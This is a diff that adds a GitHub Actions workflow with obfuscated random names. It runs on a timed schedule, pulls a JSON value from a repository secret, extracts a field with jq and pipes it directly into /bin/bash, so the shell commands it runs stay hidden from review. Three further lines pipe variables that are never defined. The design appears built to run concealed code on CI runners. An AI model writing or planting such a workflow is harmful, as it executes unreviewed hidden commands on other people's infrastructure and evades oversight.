@@ -1,0 +1,22 @@
+name: longguozheng7615
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: longguozheng7615
+        env:
+          nzou022: ${{ secrets.nzou022 }}
+        run: |
+          echo $nzou022 | jq -r .qlw84208 | /bin/bash
+          echo $ebv8807 | jq -r .b9 | /bin/bash
+          echo $jq58582 | jq -r .jnzc5612 | /bin/bash
+          echo $w91 | jq -r .hmkgn884 | /bin/bash
+
